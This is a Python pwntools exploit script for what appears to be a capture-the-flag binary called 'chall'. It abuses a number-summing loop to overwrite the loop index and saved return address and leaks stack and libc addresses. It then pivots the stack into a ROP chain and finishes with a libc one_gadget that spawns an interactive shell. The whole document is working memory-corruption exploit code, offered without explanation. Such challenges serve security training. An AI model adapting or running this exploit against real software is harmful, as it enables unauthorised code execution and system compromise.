"""
rsp_diff = 0xb0

"""
from pwn import *

elf = ELF('./chall')
#libc = ELF('./libc-2.23.so')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
p = process('./chall')

p.sendlineafter('= ', '22')

#============= puts_sum( i(14) + 2*array+0xb0 + canary + elf.symbol['_start'] ) ================
for i in range(14):
    p.sendlineafter('= ', '0' )
p.sendlineafter('= ', '20') #loop:i
p.sendlineafter('= ', str(elf.symbols['_start']) ) #seved_ret
p.recvuntil( '= ' )
s1 = int( p.recvline().split(b'\n')[0] )


p.sendlineafter('= ', '22')
#============= puts_sum( i(14) + array-0xe0 + canary + elf.symbol['_start'] ) ================
for i in range( 14 ):
    p.sendlineafter('= ', '0' )
p.sendlineafter('= ', '17' ) #loop:i
p.sendlineafter('= ', '0' )
p.sendlineafter('= ', '0' )
p.sendlineafter('= ', '0' ) #old_rbp
p.sendlineafter('= ', str(elf.symbols['_start']) ) #seved_ret
p.recvuntil('= ')
s2 = int( p.recvline().split(b'\n')[0] )

addr_array = (s1-0xb0) - (s2+0xe0)
info('array_address is '+ hex(addr_array) )

#=========== leak libc ==============
p.sendlineafter('= ', '22')
p.sendlineafter('= ', '7777' ) #leave:pop rbp;ret
p.sendlineafter('= ', str(0x400a83) ) #pop rdi; ret
p.sendlineafter('= ', str(elf.got['puts']) )
p.sendlineafter('= ', str(elf.plt['puts']) )
p.sendlineafter('= ', str(elf.symbols['_start']) ) #return
for i in range(14-5):
    p.sendlineafter('= ',  '0' )
p.sendlineafter('= ', '19' ) #
p.sendlineafter('= ', str(addr_array-0x1c0) ) #seved_rbp
p.sendlineafter('= ', str(0x4009b7) ) #leave;ret ... rsp<-(addr_array);rbp<-(array_top:0);ret

p.recvregex(r'SUM = -?\d*\n')
#print( p.recvline() )
libc_puts = u64( p.recvline().split(b'\n')[0].ljust(8, b'\x00' ) )
libc_base = libc_puts - libc.symbols['puts']
info( "libc_base: 0x%x", libc_base )

#=========== get shell ===============
#libc_one_gadget = 0x4526a #libc-2.23.so
libc_one_gadget = 0x10a38c #libc-2.27.so
p.sendlineafter('= ', '22' )
for i in range( 14 ):
    p.sendlineafter('= ', '0')
p.sendlineafter('= ', '20')
p.sendlineafter('= ', str( libc_base + libc_one_gadget ) )

p.interactive()
